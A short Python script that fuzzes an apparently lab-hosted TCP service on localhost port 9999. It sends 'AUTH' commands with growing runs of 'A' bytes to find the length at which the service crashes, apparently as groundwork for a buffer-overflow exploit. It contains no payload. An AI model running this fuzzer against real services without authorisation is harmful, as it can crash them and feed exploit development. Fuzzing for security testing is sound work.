import socket
import time

target_ip = "127.0.0.1"
target_port = 9999

buffer = b"A" * 100

while len(buffer) <= 2000:
    try:
        print(f"[*] Fuzzing AUTH with {len(buffer)} bytes...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((target_ip, target_port))
        s.recv(1024)
        s.send(b"AUTH " + buffer)
        response = s.recv(1024)
        if not response:
            print(f"[+] Fuzzing crashed at {len(buffer)} bytes! (No response received)")
            break
        s.close()
        time.sleep(0.5)
        buffer += b"A" * 100
    except Exception as e:
        print(f"[+] Fuzzing crashed at {len(buffer)} bytes! (Exception: {e})")
        break
